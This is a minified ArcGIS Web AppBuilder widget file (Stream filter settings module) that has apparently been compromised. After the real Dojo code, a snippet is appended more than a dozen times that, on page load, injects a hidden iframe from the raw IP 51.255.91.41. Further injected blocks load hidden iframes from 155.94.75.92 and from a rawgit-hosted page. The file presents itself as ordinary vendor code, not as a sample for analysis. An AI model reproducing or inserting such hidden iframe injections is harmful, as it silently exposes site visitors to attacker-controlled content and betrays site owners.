// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Stream/setting/SingleFilter.html":'\x3cdiv\x3e\r\n  \x3cdiv class\x3d"single-filter-container"\x3e\r\n    \x3cdiv\x3e\r\n      \x3cspan class\x3d"jimu-widget-normal"\x3e${nls.filterName}\x3c/span\x3e\r\n      \x3cinput data-dojo-type\x3d"dijit/form/ValidationTextBox"\r\n        data-dojo-props\x3d"required:true"\r\n        data-dojo-attach-point\x3d"filterNameEditor"\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv style\x3d"position:relative;"\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"singleFilterContent"\x3e\x3c/div\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"filterMask" class\x3d"mask"\x3e\x3c/div\x3e\r\n      \x3cspan class\x3d"jimu-widget-normal mask-tip" data-dojo-attach-point\x3d"filterMaskTip"\x3e\r\n        ${nls.filterReadOnly}\r\n      \x3c/span\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"shelter" data-dojo-type\x3d"jimu/dijit/LoadingShelter"\r\n       data-dojo-props\x3d\'hidden:true\'\x3e\x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dojo/_base/lang dojo/json dojo/on dojo/Evented dojo/dom-style dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./SingleFilter.html jimu/dijit/Filter jimu/dijit/SimpleTable jimu/dijit/LoadingShelter dijit/form/ValidationTextBox".split(" "),function(d,b,e,f,g,a,h,k,l,m,n){return d([h,k,l,g],{baseClass:"jimu-widget-stream-filter",templateString:m,streamLayer:null,config:null,_inherited:null,_definitionExpression:null,postCreate:function(){this.inherited(arguments);
this._inherited=!1;this._definitionExpression="";this._init()},_init:function(){var c;this.filterNameEditor.set("value",this.config.name||this.nls.newFilter);"inherited"in this.config&&(this._inherited=this.config.inherited);"definitionExpression"in this.config&&(this._definitionExpression=this.config.definitionExpression);this.own(f(this.filterNameEditor,"change",b.hitch(this,function(a){this.emit("filterNameChanged",a)})));this.filter=new n({enableAskForValues:!0,noFilterTip:this.nls.noFilterTip,
style:"width:100%;margin-top:22px;"});this.filter.placeAt(this.singleFilterContent);this._inherited?(a.set(this.filterMask,"display","block"),a.set(this.filterMaskTip,"display","block")):(a.set(this.filterMask,"display","none"),a.set(this.filterMaskTip,"display","none"));this.streamLayer&&this.config&&(this.shelter.show(),c=e.parse(this.streamLayer._json),"object"===typeof this.config&&"object"===typeof this.config.filterInfo?this.filter.buildByFilterObj(this.streamLayer.url,this.config.filterInfo,
c).then(b.hitch(this,function(){this.shelter.hide()})):this.filter.buildByExpr(this.streamLayer.url,"1\x3d1",c).then(b.hitch(this,function(){this.shelter.hide()})))},getConfig:function(){return{inherited:this._inherited,definitionExpression:this._definitionExpression,name:this.filterNameEditor.get("value"),filterInfo:this.filter.toJson()}}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});